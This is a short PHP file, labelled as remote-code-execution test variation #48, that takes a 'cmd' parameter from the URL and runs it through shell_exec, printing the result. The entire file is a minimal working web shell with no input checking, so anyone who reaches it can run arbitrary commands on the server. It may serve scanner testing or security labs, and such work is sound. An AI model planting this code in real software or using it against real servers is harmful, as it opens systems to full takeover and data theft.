<?php
// RCE test variation #48
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>